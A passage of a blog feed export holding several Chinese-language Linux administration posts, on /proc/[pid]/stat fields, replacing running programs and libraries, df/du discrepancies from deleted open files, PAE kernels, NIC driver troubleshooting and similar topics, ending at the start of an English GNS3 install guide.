      <content type="html"><![CDATA[<p>[root@localhost ~]# cat /proc/6873/stat<br>6873 (a.out) R 6723 6873 6723 34819 6873 8388608 77 0 0 0 41958 31 0 0 25 0 3 0 5882654 1409024 56 4294967295 134512640 134513720 3215579040 0 2097798 0 0 0 0 0 0 0 17 0 0 0 [root@localhost ~]#</p><p>每个参数意思为：<br>参数 解释<br>pid=6873 进程(包括轻量级进程，即线程)号<br>comm=a.out 应用程序或命令的名字<br>task_state=R 任务的状态，R:runnign, S:sleeping (TASK_INTERRUPTIBLE), D:disk sleep (TASK_UNINTERRUPTIBLE), T: stopped, T:tracing stop,Z:zombie, X:dead<br>ppid=6723 父进程ID<br>pgid=6873 线程组号<br>sid=6723 c该任务所在的会话组ID<br>tty_nr=34819(pts/3) 该任务的tty终端的设备号，INT（34817/256）=主设备号，（34817-主设备号）=次设备号<br>tty_pgrp=6873 终端的进程组号，当前运行在该任务所在终端的前台任务(包括shell 应用程序)的PID。<br>task-&gt;flags=8388608 进程标志位，查看该任务的特性<br>min_flt=77 该任务不需要从硬盘拷数据而发生的缺页（次缺页）的次数<br>cmin_flt=0 累计的该任务的所有的waited-for进程曾经发生的次缺页的次数目<br>maj_flt=0 该任务需要从硬盘拷数据而发生的缺页（主缺页）的次数<br>cmaj_flt=0 累计的该任务的所有的waited-for进程曾经发生的主缺页的次数目<br>utime=1587 该任务在用户态运行的时间，单位为jiffies<br>stime=1 该任务在核心态运行的时间，单位为jiffies<br>cutime=0 累计的该任务的所有的waited-for进程曾经在用户态运行的时间，单位为jiffies<br>cstime=0 累计的该任务的所有的waited-for进程曾经在核心态运行的时间，单位为jiffies<br>priority=25 任务的动态优先级<br>nice=0 任务的静态优先级<br>num_threads=3 该任务所在的线程组里线程的个数<br>it_real_value=0 由于计时间隔导致的下一个 SIGALRM 发送进程的时延，以 jiffy 为单位.<br>start_time=5882654 该任务启动的时间，单位为jiffies<br>vsize=1409024（page） 该任务的虚拟地址空间大小<br>rss=56(page) 该任务当前驻留物理地址空间的大小<br>Number of pages the process has in real memory,minu 3 for administrative purpose.<br>这些页可能用于代码，数据和栈。<br>rlim=4294967295（bytes） 该任务能驻留物理地址空间的最大值<br>start_code=134512640 该任务在虚拟地址空间的代码段的起始地址<br>end_code=134513720 该任务在虚拟地址空间的代码段的结束地址<br>start_stack=3215579040 该任务在虚拟地址空间的栈的结束地址<br>kstkesp=0 esp(32 位堆栈指针) 的当前值, 与在进程的内核堆栈页得到的一致.<br>kstkeip=2097798 指向将要执行的指令的指针, EIP(32 位指令指针)的当前值.<br>pendingsig=0 待处理信号的位图，记录发送给进程的普通信号<br>block_sig=0 阻塞信号的位图<br>sigign=0 忽略的信号的位图<br>sigcatch=082985 被俘获的信号的位图<br>wchan=0 如果该进程是睡眠状态，该值给出调度的调用点<br>nswap 被swapped的页数，当前没用<br>cnswap 所有子进程被swapped的页数的和，当前没用<br>exit_signal=17 该进程结束时，向父进程所发送的信号<br>task_cpu(task)=0 运行在哪个CPU上<br>task_rt_priority=0 实时进程的相对优先级别<br>task_policy=0 进程的调度策略，0=非实时进程，1=FIFO实时进程；2=RR实时进程</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> /proc/[pid]/stat </tag>
            
            <tag> 文件解释 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>晚安，2010 - suchalin的2010纪念册</title>
      <link href="/2011/01/06/good-night-2010-suchalin-s-2010-album/"/>
      <url>/2011/01/06/good-night-2010-suchalin-s-2010-album/</url>
      <content type="html"><![CDATA[]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Linux下替换运行中的程序</title>
      <link href="/2011/01/06/linux-is-replacing-running-programs/"/>
      <url>/2011/01/06/linux-is-replacing-running-programs/</url>
      <content type="html"><![CDATA[<p>今天被朋友问及“Linux下可以替换运行中的程序么？”，以前依稀记得Linux下是可以的（而Windows就不让），于是随口答道“OK”。结果朋友发来一个执行结果：（test正在运行中）</p><p># cp test2 test  cp: cannot create regular file `test’: Text file busy</p><p>看起来是程序被占用，无法覆盖。于是自己又再做了几个实验：</p><p>（1）先rm删除正在运行的test，然后cp test2 test就没有错误了。<br>（2）先mv改名正在运行的test，然后cp test2 test也没有问题。</p><p>查了查资料并动手分析了一下，找到了比较满意的解释。cp并不改变目标文件的inode，事实上它的实现是这样的：</p><p># strace cp test2 test  2&gt;&amp;1 | grep open.*test  open(“test2”, O_RDONLY|O_LARGEFILE)        = 3  open(“test”, O_WRONLY|O_TRUNC|O_LARGEFILE) = 4</p><p>//O_TRUNC        如果文件存在，并且以只写/读写方式打开，则清空文件全部内容</p><p>我原以为cp的实现是“rm + open(O_CREAT)”，不过现在想想上面的实现方式才是最可靠的（保证了时序安全和目标文件的属性）。这也可以解释为什么cp的目标文件会继承被覆盖文件的属性而非源文件。</p><p>Linux由于Demand Paging机制的关系，必须确保正在运行中的程序镜像（注意，并非文件本身）不被意外修改，因此内核在启动程序后会锁定这个程序镜像的inode。这就是为什么cp在用“O_WRONLY|O_TRUNC”模式open目标文件时会失败。而先rm再cp的话，新文件的inode其实已经改变了，原inode并没有被真正删除，直到内核释放对它的引用。同理，mv只是改变了文件名，其inode不变，新文件使用了新的inode。</p><p>问题到这里已经水落石出，不过刨根究底的个性驱使我再做了以下一组实验，没想到结果完全出乎我意料之外！</p><p>写了一个简单的测试程序：</p><p>#include &lt;stdio.h&gt;    int main(int argc, char * argv[])  {      foo();  // An export function by libtest.so.      sleep(1000);      return 0;  }</p><p>foo()是另一个测试动态库libtest.so的导出接口，只打印一行提示就返回。接下来我把上面对执行文件的测试用例对动态库又做了一遍：</p><p>（1）cp libtest2.so libtest.so可以直接覆盖已加载的动态库。<br>（2）先rm删除已加载的libtest.so，然后cp libtest2.so libtest.so成功。<br>（3）先mv改名已加载的libtest.so，然后cp libtest2.so libtest.so成功。</p><p>除了第一个用例外，结果相同。这样看来，动态库被加载时难道ld并没有锁定inode？不过想想也可以宽恕，毕竟ld也是用户态程序，没有权利去锁定inode，也不应与内核的文件系统底层实现耦合。</p><p>到这里都还算在情理之中，看起来Linux也都处理的很好。不过还剩下一个问题：动态库被以cp的方式覆盖后难道不会和Demand Paging机制产生冲突？</p><p>在思考这个问题的过程中，我意识到前面这个测试程序的一个致命漏洞，稍作修改如下：</p><p>#include &lt;stdio.h&gt;    int main(int argc, char * argv[])  {  loop:      foo();  // An export function by libtest.so.      sleep(1);      goto loop;      return 0;  }</p><p>这次，再执行上面的三个用例后发现，“cp libtest2.so libtest.so”虽然仍可直接覆盖已加载的动态库，但是测试程序马上出现了“Segmentation fault”。而后两个用例结果不变。由此可见，想要安全的替换已加载的动态库，还是用“笨拙”的“rm + cp”吧，看似捷径的“cp覆盖”会直接葬送掉你的程序……</p><p>看来，我再一次低估了Linux的健壮性，看似符合逻辑的流程也可能会带来灾难性的后果；“rm &amp; cp”与“cp覆盖”背后所隐藏的底层差异却可以成为你的救星。Linux用得越久越是让人觉得这是一块充满了荆棘和陷阱的原始丛林，只有步步为营实踏前行才能走的更远。</p><p>注：以上实验基于SuSE Linux Enterprise Server 9 SP1（Linux 2.6.5 &amp; glibc 2.3.3）。</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux下替换运行中的程序 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Linux中时间戳转换命令</title>
      <link href="/2010/12/30/the-timestamp-conversion-command-in-linux/"/>
      <url>/2010/12/30/the-timestamp-conversion-command-in-linux/</url>
      <content type="html"><![CDATA[<p>1、时间戳转换为正常显示的时间格式  </p><p>Freebsd系统下：</p><p>转换命令为：date -r 1112173761     或者：date -r 1112173761 +”%Y-%m-%d %T %z”（年月日的格式不一样）</p><p>Linux系统下：</p><p>转换命令：date -d ‘1970-01-01 UTC 1112173761 seconds’”  或者 date -d ‘1970-01-01 UTC 1112173761 seconds’ +”%Y-%m-%d %T %z” （年月日格式不一样）</p><p>时间戳转换为正常显示的时间格式，问题解决了，那么如何把我们正常的时间格式转为时间戳呢</p><p>2、正常显示的时间格式转换为时间戳  </p><p>php把当前时间转换为时间戳 </p><p>php -r “echo(mktime());”</p><p>这里需要说下，使用php的时候，如果不想每次都在文件中编写执行，就是用php -r命令，就把后面的脚本执行了。</p><p>php把未来某天的时间转为时间戳</p><p>php -r “echo(strtotime(‘+2 days’));”     //把后天的时间转为时间戳</p><p>我测试的系统需要把过期时间比较久，那么至少要在我测试完系统才要他过期，不需要每次时间到了又要更换过期时间，我就把过期时间设为100天，执行命令如下：</p><p>php -r “echo(strtotime(‘+100 days’));”</p><p>Linux、FreeBsd系统当前时间转换为时间戳：</p><p>date +%s</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux中时间戳转换命令 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>printk X messages suppressed</title>
      <link href="/2010/12/30/printk-x-messages-suppressed/"/>
      <url>/2010/12/30/printk-x-messages-suppressed/</url>
      <content type="html"><![CDATA[<p>X为自然数</p><p>echo 0 &gt; /proc/sys/kernel/printk_ratelimit</p><p>由于某些原因，频繁设置循环调用某个printk的语句，将会造成CPU的拥堵，如果输入终端是慢速，就会造成拥堵，我们也不可能从这种狂刷屏幕上读取到什么有效信息，基本上就看不清。内核编程提供了一下保护机制。下面是一个测试的例子：  </p><p>1 for (i = 0 ; i &lt; 1000; i ++){<br>2    if(printk_ratelimit()){<br>3        printk(KERN_DEBUG “Test for ratelimte i = %d j = %d\n”,i ,++j);<br>4    }<br>5 }<br>6 printk(KERN_NOTICE “After Test i = %d j = %d\n”,i , j);  </p><p>printk_ratelimit()根据打印的频繁程度返回的一个值，根据这个值我们决定是否将debug信息打印出来。这个返回值取决于两个因素，分别定义在<br>/proc/sys/kernel/printk_ratelimit<br>/proc/sys/kernel/printk_ratelimit_burst<br>前者表示当这个值置为0后隔多少秒后恢复为1，即等待允许再次打印的时间（秒），后者可能和缓存队列长度有关，他表示在值为0之前，可以printk的条目数。系统缺省值为5和10，也就是在printk_ratelimit()的控制下，每秒可以有两个输出。在上面的例子，我们看到输出了10次。我想象的处理机制是，系统根据printk_ratelimit_burst的值设置一个队列长度，如果这个队列满，则值printk_ratelimit()为0，禁止新的消息加入队列，等待printk_ratelimit秒设定的时间，将 printk_ratelimit()设为1，即允许新的消息加入队列。这种方式我曾用于处理业务请求，设定允许接纳请求的频率，避免burst的出现。我猜想这里面的机制也是类似的。不管如何，这是一种看行之有效的方法。</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> messages </tag>
            
            <tag> printk </tag>
            
            <tag> suppressed </tag>
            
            <tag> x </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ADSL的上行带宽参考</title>
      <link href="/2010/12/29/adsl-s-uplink-bandwidth-reference/"/>
      <url>/2010/12/29/adsl-s-uplink-bandwidth-reference/</url>
      <content type="html"><![CDATA[<p>ADSL带宽为非对称性，有理论值和实际值区分。ADSL上行带宽最高为1M。<br>带宽    上行        理论值           实际<br>1M      上行        256K          32K~200K<br>2M      上行        384K          32K~330K<br>3M      上行        512K          32K~450K<br>4M      上行        640K          32K~550K<br>12M     上行        768K          32K~700K<br>16M     上行        1M            ADSL上行带宽最高为1M。</p><p>ADSL线路的长度一般不超过三公里，ADSL 带宽越高，对线路要求越高，即用的线材一定要好，而且线的距离要求越短．例如一个6M的ADSL,用户接入点距离上级接入点的距离不超过两公里，如果超过两公里，监控视频的速度还不如一个相同距离４Ｍ的ADSL 效果好．所以并不是带宽越高效果就越好，还有许多外界因素有关．</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> adsl的上行带宽参考 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>linux下文件大小不一致的情况分析，文件空洞</title>
      <link href="/2010/12/28/in-linux-the-file-size-is-inconsistent-and-the-file-is-empty/"/>
      <url>/2010/12/28/in-linux-the-file-size-is-inconsistent-and-the-file-is-empty/</url>
      <content type="html"><![CDATA[<p>df 显示的已使用磁盘占用率比du 统计出来的结果要大很多。原因，主要是由于两者计算结果的方式不同。</p><p>一、实验情况</p><p>1、创建并删除文件</p><p>创建文件前的磁盘容量情况：</p><p># df -h</p><p>文件系统              容量  已用 可用 已用% 挂载点</p><p>/dev/sda1              12G  5.7G  5.5G  51% /</p><p>tmpfs                 506M     0  506M   0% /dev/shm</p><p>创建文件：</p><p># dd if=/dev/zero of=test.iso bs=1024k count=1000</p><p>1000+0 records in</p><p>1000+0 records out</p><p>1048576000 bytes (1.0 GB) copied, 14.3055 seconds, 73.3 MB/s</p><p>现在的磁盘情况：</p><p># df -h</p><p>文件系统              容量  已用 可用 已用% 挂载点</p><p>/dev/sda1              12G  6.7G  4.6G  60% /</p><p>tmpfs                 506M     0  506M   0% /dev/shm</p><p>模拟某个进程正在使用该文件：</p><h1 id="tail-f-tmp-test-iso"><a href="#tail-f-tmp-test-iso" class="headerlink" title="tail -f /tmp/test.iso"></a>tail -f /tmp/test.iso</h1><p>2、删除该文件</p><p>打开另一个终端，登陆到系统中。</p><p>查看是否有进程正在使用上面创建的文件：</p><p># lsof |grep test.iso</p><p>tail      2175      root    3r      REG        8,1 1048576000     752972 /tmp/test.iso</p><p>把该文件删掉，并确认：</p><p># rm /tmp/test.iso</p><p>rm：是否删除 一般文件 “/tmp/test.iso”? y</p><p># ls /tmp/test.iso</p><p>ls: /tmp/test.iso: 没有那个文件或目录</p><p>查看是否还有进程在使用（注意结尾的标记）：</p><p># lsof |grep test.iso</p><p>tail      2175      root    3r      REG        8,1 1048576000     752972 /tmp/test.iso (deleted)</p><p>查看磁盘使用情况：</p><p># df -h</p><p>文件系统              容量  已用 可用 已用% 挂载点</p><p>/dev/sda1              12G  6.7G  4.6G  60% /</p><p>tmpfs                 506M     0  506M   0% /dev/shm</p><p># cat /proc/diskstats |grep sda1</p><p>   8    1 sda1 54385 5184 1626626 130090 20434 635997 5251448 5345733 0 111685 5475829</p><p>可见，虽然从ls 已经无法找到该文件，但因为tail 进程仍在使用该文件，故实际上内核并没有把这文件所占用的空间释放出来（df 的结果）。</p><p>3、停止相关进程</p><p>回到第一终端，用Ctrl+C 终止tail 进程，查看结果：</p><p># df -h</p><p>文件系统              容量  已用 可用 已用% 挂载点</p><p>/dev/sda1              12G  5.7G  5.5G  51% /</p><p>tmpfs                 506M     0  506M   0% /dev/shm</p><p># cat /proc/diskstats |grep sda1</p><p>   8    1 sda1 54473 5184 1627402 130617 20453 636042 5251960 5345756 0 112226 5476379</p><p>至此，文件所占用的空间已完全释放。</p><p>二、说明</p><p>从上面的实验，可得出一些情况：</p><p>1、若有进程在占用某个文件，而其他进程把这文件删掉，只会删除其在磁盘中的标记，而不会释放其占用的磁盘空间；直到所有访问该文件的进程退出为止；</p><p>2、df 是从内核中获取磁盘占用情况数据的，而du是统计当前磁盘文件大小的结果，由于磁盘标记已被删掉，因此du 不会计算上述被删除文件的空间，导致df 与 du的结果不一致。</p><p>三、解决问题</p><p>通常的解决方法有两个：</p><p>1、把占用文件的相关进程关闭</p><p>这可通过下面的命令得到这些已被删除，但未释放空间的文件和进程信息：</p><p># lsof |grep deleted </p><p>找到这些进程后，在安全的情况下把其关闭，空间自会马上释放。</p><p>2、以清空的方式替代删除</p><p>归根到底，产生问题的原因是，访问该文件的文件指针（句柄），在rm 动作后，因为进程仍在访问，因此，仍处在文件里面（中间或结尾处）。所以，如果用清空的方式，把文件指针重置，该文件所占用的空间也会马上释放出来。</p><p># echo &gt; /tmp/test.iso</p><p># df -h</p><p>文件系统              容量  已用 可用 已用% 挂载点</p><p>/dev/sda1              12G  5.7G  5.5G  51% /</p><p>tmpfs                 506M     0  506M   0% /dev/shm</p><p># tail -f /tmp/test.iso</p><p>tail: /tmp/test.iso: file truncated</p><p>所以，对于常发生类似问题的文件，如：日志记录文件等。以改名、清空、删除的顺序操作可避免问题。</p><p>四、补充</p><p>除rm外，有些不明显的操作，也会产生类似的问题。</p><p>例如 gzip 命令，其对某个文件xxx.log进行压缩时，会产生一个新的xxx.log.gz文件，完成后，会把原来的xxx.log删除。</p><p>这时，若仍有进程在使用xxx.log文件，那么，实际上，该文件还是只会标记为deleted，其空间也不会释放，问题与上面提到的情况是相同的。所以，在编写脚本时，可先判断是否仍有进程正在使用该文件，然后再进行gzip 操作。</p><p>五 文件空洞</p><p>   文件读写时，如果先文件指针偏移很大一段，然后写入1byte；这样这个文件实际占用1byte空间，但是stat查看文件大小，或者读写时，都会发现文件很大；所有没有写内容的都返回0，且不占用空间，这样的文件叫 ‘sparse file’，即文件空洞</p><pre><code>容易发生在一个进程在写一个文件，这是人工进行清空文件操作，就会产生。</code></pre>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux下文件大小不一致的情况分析 </tag>
            
            <tag> 但东西没有回收 </tag>
            
            <tag> 删除了文件 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>linux下可用内存只有不到4G</title>
      <link href="/2010/12/27/linux-has-less-than-4g-available-memory/"/>
      <url>/2010/12/27/linux-has-less-than-4g-available-memory/</url>
      <content type="html"><![CDATA[<p>硬件没报错，free -m查出的总内存还不到4G，最后居然是升级kernel时，没有升级成kernel-pae版本，而是标准的版本，所以内核可控制的总内存就有限，呵呵。。</p><p>操作系统在32bit x86平台上最大寻址空间只有4GB，如果要使用大于4GB的内存，就必须使用Intel的PAE（物理地址扩展）模式。在Windows NT平台实现PAE只需要对boot.ini加上/pae即可。而对于RHEL5，缺省安装模式下是不允许检测超过4GB内存，所以我们需要在内核安装完毕后再安装kernel-PAE套件。  </p><p>x86平台的硬件支持两级页表，Intel Pentium pro以上的型号均支持PAE和三级页表，使得系统最大寻址达到36位，就是64GB的内存。但是系统进程运行时使用的永远是虚拟地址，在32位字长的i386机器上，一个进程永远无法访问超出4G的字节。kernel只能通过拼凑的方式计算出大于4G的内存地址。  </p><p>在Linux kernel配置项里有High Memmory Support, 如果总内存小于等于1G的选”off”,大于4G的选”64G”<br>Note: Linux can use up to 64 Gigabytes of physical memory on x86 systems. However, the address space of 32-bit x86 processors is only 4 Gigabytes large. Thus means that, if you have a large amount of physical memory, not all of it can be “permanently mapped” by the kernel. The physical memory that’s not permanently mapped is called “high memory”.  </p><p>还有一项Allocate 3rd-level pagetables from highmem，使用这一项可以在内存很多(大于4G)的机器上将用户空间的页表放到高位内存区,以节约宝贵的低端内存。  </p><p>缺省安装的内核不允许红帽企业 Linux 5检测超过 4GB 的内存。因此，如果你的系统有超过 4GB 的内存，你将需要在内核安装完毕后再安装 kernel-PAE 套件。</p><p>关解决方法如下：</p><p>主要需要2个方面设置：</p><p>1.bios:在bios里开启对大内存的设置</p><p>2.安装支持大内存的kernel</p><p>centos 5.0 默认安装 for i386的内核不支持 4g+的内存需要安装上kernel-PAE（原kernel-hugemem包）操作很简单！</p><p>1.#yum install kernel-PAE</p><p>2.#vi /boot/grub/grub.conf</p><p>boot=/dev/md0</p><p>default=0</p><p>timeout=5</p><p>splashimage=(hd0,0)/grub/splash.xpm.gz hiddenmenu</p><p>修改设置为默认启动 default=0</p><p>3.#init 6</p><p>重启服务器后我们可以free发现正常</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux下可用内存只有不到4g </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>是否是因为bnx2id的启动而引起的网卡down</title>
      <link href="/2010/12/27/whether-it-is-because-of-the-bnx2id-startup-and-the-network-card-down/"/>
      <url>/2010/12/27/whether-it-is-because-of-the-bnx2id-startup-and-the-network-card-down/</url>
      <content type="html"><![CDATA[<p>在安装redhat as5.4系统上默认的Broadcom NetXtreme II BCM 5709驱动为1.9.3，经常出现网卡会down的情况。经和dell沟通后，将网卡的驱动降为1.9.20d，降级后很久没有再出现过问题，</p><p>后来在一台服务器上再次出现了网卡down的情况，经分析发现down的服务器上多了一个bnx2id的服务。是否是因为bnx2id的启动而引起的网卡down。谢谢！以下是一些服务器信息，如有需要进一步的信息，请联系！</p><p>网卡驱动模块信息</p><p>modinfo bnx2</p><p>filename:       /lib/modules/2.6.18-164.el5PAE/updates/bnx2.ko</p><p>version:        1.9.20d</p><p>license:        GPL</p><p>description:    Broadcom NetXtreme II BCM5706/5708/5709/5716 Driver</p><p>author:         Michael Chan &lt;<a href="mailto:mchan@broadcom.com" target="_blank" rel="noopener">mchan@broadcom.com</a>&gt;</p><p>srcversion:     44355DFF4A0181C084FA24C</p><p>alias:          pci:v000014E4d0000163Csv*sd*bc*sc*i*</p><p>alias:          pci:v000014E4d0000163Bsv*sd*bc*sc*i*</p><p>alias:          pci:v000014E4d0000163Asv*sd*bc*sc*i*</p><p>alias:          pci:v000014E4d00001639sv*sd*bc*sc*i*</p><p>alias:          pci:v000014E4d000016ACsv*sd*bc*sc*i*</p><p>alias:          pci:v000014E4d000016AAsv*sd*bc*sc*i*</p><p>alias:          pci:v000014E4d000016AAsv0000103Csd00003102bc*sc*i*</p><p>alias:          pci:v000014E4d0000164Csv*sd*bc*sc*i*</p><p>alias:          pci:v000014E4d0000164Asv*sd*bc*sc*i*</p><p>alias:          pci:v000014E4d0000164Asv0000103Csd00003106bc*sc*i*</p><p>alias:          pci:v000014E4d0000164Asv0000103Csd00003101bc*sc*i*</p><p>depends:       </p><p>vermagic:       2.6.18-164.el5PAE SMP mod_unload 686 REGPARM 4KSTACKS gcc-4. 1</p><p>parm:           disable_msi:Disable Message Signaled Interrupt (MSI) (int)</p><p>chkconfig –list|grep bnx</p><p>bnx2id          0:on    1:on    2:on    3:on    4:on    5:on    6:on</p><p>bnx2id的服务启动脚本</p><p>cat /etc/init.d/bnx2id</p><p>#!/bin/sh</p><p>#</p><p># chkconfig: 345 6 90</p><p># description: Starts and stops Broadcom’s iSCSI initiator software</p><p>#</p><p># processname: bnx2id</p><p># pidfile: /var/run/bnx2id.pid</p><p># Source function library.</p><p>. /etc/init.d/functions</p><p>PATH=/sbin:/bin:/usr/sbin:/usr/bin</p><p>RETVAL=0</p><p>start()</p><p>{</p><pre><code>echo -n $&quot;Starting Broadcom iSCSI initiator software: &quot;modprobe -q bnx2idev\_maj\_no=\`cat /proc/devices  | awk &apos;/bnx2i/{print $1}&apos;\`\\rm -rf /dev/bnx2imknod /dev/bnx2i c ${dev\_maj\_no} 0daemon bnx2idRETVAL=$?successecho[ $RETVAL -eq 0 ] || return</code></pre><p>}</p><p>stop()</p><p>{</p><pre><code>echo -n $&quot;Stopping Broadcom iSCSI initiator software: &quot;rmmod bnx2i 2&gt;/dev/nullrmmod cnic 2&gt;/dev/nullsleep 5rm -f /var/run/bnx2id.pidpkill -KILL bnx2idsuccessecho</code></pre><p>}</p><p>restart()</p><p>{</p><pre><code>stopstart</code></pre><p>}</p><p>case “$1” in</p><pre><code>start)                start                ;;stop)                stop                ;;restart)       ;          stop                start                ;;status)                status bnx2id                RETVAL=$?                ;;*)                echo $&quot;Usage: $0 {start|stop|restart|status}&quot;                exit 1</code></pre><p>esac</p><p>exit $RETVAL</p><p>操作系统版本</p><p>lsb_release -a</p><p>LSB Version:    :core-3.1-ia32:core-3.1-noarch:graphics-3.1-ia32:graphics-3.1-noarch</p><p>Distributor ID: RedHatEnterpriseServer</p><p>Description:    Red Hat Enterprise Linux Server release 5.4 (Tikanga)</p><p>Release:        5.4</p><p>Codename:       Tikanga</p><p>uname -a</p><p>Linux 192_168_167_41 2.6.18-164.el5PAE #1 SMP Tue Aug 18 15:59:11 EDT 2009 i686 i686 i386 GNU/Linux</p><p>硬件型号</p><p>dmidecode -t 1</p><p># dmidecode 2.9</p><p>SMBIOS 2.6 present.</p><p>Handle 0x0100, DMI type 1, 27 bytes</p><p>System Information</p><pre><code>Manufacturer: Dell Inc.Product Name: PowerEdge R610Version: Not SpecifiedSerial Number: XXXXXXXUUID: 44454C4C-3600-1043-8033-B6C04F583258Wake-up Type: Power SwitchSKU Number: Not SpecifiedFamily: Not Specified</code></pre>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 是否是因为bnx2id的启动而引起的网卡down </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>“NETDEV WATCHDOG: eth0: transmit timed out”问题解决办法小结</title>
      <link href="/2010/12/27/netdev-watchdog-eth0-transmit-timed-out-solution-summary/"/>
      <url>/2010/12/27/netdev-watchdog-eth0-transmit-timed-out-solution-summary/</url>
      <content type="html"><![CDATA[<p>这个问题可真是疑难杂症了，从2001年甚至更早到2009年5月就在前几天，都有人在网上问这个问题，并且能得到答案的人很少，能最终解决了的更是少之又少。我也遇到了这个问题，经过千辛万苦终于找到了答案。这个问题的答案不只一个，我做个小结，你可以挨个试试，应该有一个适合你的情况。</p><p>先说我的情况。我以前是debian ＋ win2K 双系统。最近终于决定要升级到winxp了。在原来win的分区重新装了xp后，就出现这种问题了。可偏偏此前还升级了debian，并在xp下运行过p2pover之类的软件。所以问题原因就不好确定了。最后，确定原因是：winxp的网卡设置里有一项功能是在关闭xp时关闭网卡的网络唤醒（wake－on－lan）。而debian却偏偏不能把这个打开。这才出现了这个问题。解决办法呢，就是在winxp下，右键点击“网上邻居”，点击“属性”，在右键点击“本地连接”，再点“属性”-&gt;”配置”-&gt;”高级”，然后设置“Wake-on-LAN”为“enable”。然后重启，进入linux就可以联网了。</p><p>下面是我在搜索过程中看到的其他情况的解决办法：</p><p>1. 打开/boot/grub/menu.lst文件，在启动的核心kernel那行最后加上： acpi=off noapic。</p><p>   其中：1) acpi=off 禁止了一些电源高级管理功能，对你的应用程序没有影响。</p><pre><code>2）noapic 改变了中断方式，对应用也没有影响。  </code></pre><p>   详见：<a href="http://blog.chinaunix.net/u/25264/showart_545308.html" target="_blank" rel="noopener">http://blog.chinaunix.net/u/25264/showart_545308.html</a><br>2. ethtool -K eth0 tso off<br>3. 重新装网卡驱动。<br>   rmmod r8169 &amp;&amp; modprobe r8169 &amp;&amp; update-modules<br>   或更彻底点重新下载个驱动安装，不一定下最新的，因为更新的驱动可能会不适合一些老网卡，所以老的驱动可能没有这个 问题。<br>4. 换用旧的内核试试。<br>5. 关闭ecn。 在文件/etc/sysctl.conf中加入 net.ipv4.tcp_ecn=0<br>6. 关闭IPV6支持。在文件/etc/modprobe.d/aliases中把alias net-pf-10 ipv6 替换成如下两行：<br>   alias net-pf-10 off<br>   alias ipv6 off<br>7. 强制设定网卡工作模式： mii-tool 100baseTx-HD<br>   100baseTx-HD 是100M双绞线全双工的意思。其他的可以mii-tool –help看看，或到网上查查。</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> eth0: </tag>
            
            <tag> netdev </tag>
            
            <tag> out </tag>
            
            <tag> timed </tag>
            
            <tag> transmit </tag>
            
            <tag> watchdog: </tag>
            
            <tag> 问题解决办法小结 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>安装绿色版vmware时出现提示“未能初始化远程显示子系统”</title>
      <link href="/2010/12/22/when-installing-the-green-version-of-vmware-the-presence-of-failed-to-initialize-the-remote-display-subsystem/"/>
      <url>/2010/12/22/when-installing-the-green-version-of-vmware-the-presence-of-failed-to-initialize-the-remote-display-subsystem/</url>
      <content type="html"><![CDATA[<p>安装完成后，启动虚拟机时提示“未能初始化远程显示子系统。”、”找不到一个要连接的有效 peer 进程。”</p><p>解决方法：</p><p>右击我的电脑–管理—本地用户和组里面的用户一栏，查看右边，里面是否有个__vmware_user__的账户，没有的话可能是这个原因，创建一个试试，实在不可以尝试卸载重新安装试试吧，绿色版vm的要运行安装.bat之类的才可以用的。</p><p> 我之前运行安装的时候就是因为建立的帐户密码达不到域策略的密码强度所以建立用户失败，自己手动建立就好了</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vmware </tag>
            
            <tag> 找不到一个要连接的有效 </tag>
            
            <tag> 未能初始化远程显示子系统 </tag>
            
            <tag> 绿色 </tag>
            
            <tag> 解决 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>linux 查看有多少个交换分区或交换文件在使用的方法</title>
      <link href="/2010/12/19/linux-looks-at-how-many-swap-partitions-or-exchange-files-are-used/"/>
      <url>/2010/12/19/linux-looks-at-how-many-swap-partitions-or-exchange-files-are-used/</url>
      <content type="html"><![CDATA[<p>cat /proc/swaps</p><p>或swapon -s</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> 查看有多少个交换分区或交换文件在使用的方法 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>How To Install GNS3 on Centos/Redhat/Fedora .</title>
      <link href="/2010/12/14/how-to-install-gns3-on-centos-redhat-fedora/"/>
      <url>/2010/12/14/how-to-install-gns3-on-centos-redhat-fedora/</url>
      <content type="html"><![CDATA[<p>You won’t find detailed instructions for <a href="http://networkingtips-tricks.blogspot.com/" target="_blank" rel="noopener">GNS3</a> installation on Centos/Redhat/Fedora over the net, So I decided to make one for our certcollection members. Installing GNS3 on Centos/Redhat/Fedora can be very tedious task. But If you follow my Steps given below you can setup and run GNS3 without any difficulty. Since Qt 4.5.1 binary which is required for GNS3 is not available for these OS’s, we’ll have to compile it from the source.<br>IMP:: Installation of all this packages will take a lot of time. So do it when you are free.<br>OK lets roll<br>First we’ll have to install dependencies<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 